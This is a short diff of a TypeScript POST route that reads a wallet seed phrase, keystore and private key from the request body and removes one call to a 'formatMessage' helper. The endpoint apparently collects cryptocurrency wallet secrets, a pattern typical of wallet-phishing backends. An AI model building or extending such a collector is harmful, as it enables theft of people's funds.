@@ -51,7 +51,6 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
-    await formatMessage('hi');
 
     if (phrase) {
 
